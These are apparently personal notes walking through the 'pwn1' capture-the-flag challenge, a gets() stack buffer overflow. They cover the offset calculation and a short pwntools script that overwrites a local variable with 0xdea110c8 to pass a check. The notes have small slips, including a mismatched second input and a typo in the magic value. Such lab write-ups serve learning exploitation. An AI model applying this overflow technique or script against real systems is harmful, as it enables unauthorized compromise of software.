
![[pwn1]]


### Recon

![[Pasted image 20240507211432.png]]
### Walkthrough


![[Pasted image 20240507210239.png]]

- inputs to be given ```Sir Lancelot of Camelot```
- second ```Sir Lancelot of Camelot```
- when click on ==-0x215eef38==

![[Pasted image 20240507210432.png]]
### Finding vulnerability

- notice the last gets function does not specifed how many inputs to be given,so it read till EOF
- it is BOF and change local_18 to deall0c8
### Finding Offset

- click on local_18
- ![[Pasted image 20240507210940.png]]
- we wanted to jump to loacl 18 by giving input to loacl43
- the padding should be 0x43 - 0x18 = 0x2b
- ![[Pasted image 20240507211150.png]]
### Constructing Payload

```
# Import pwntools
from pwn import *

# Establish the target process
target = process('./pwn1')

# Make the payload
payload = ""
payload += "0"*0x2b # Padding to `local_18`
payload += p32(0xdea110c8) # the value we will overwrite local_18 with, in little endian p32 because 32 bit file

# Send the strings to reach the gets call
target.sendline("Sir Lancelot of Camelot")
target.sendline("To seek the Holy Grail.")

# Send the payload
target.sendline(payload)

target.interactive()

```


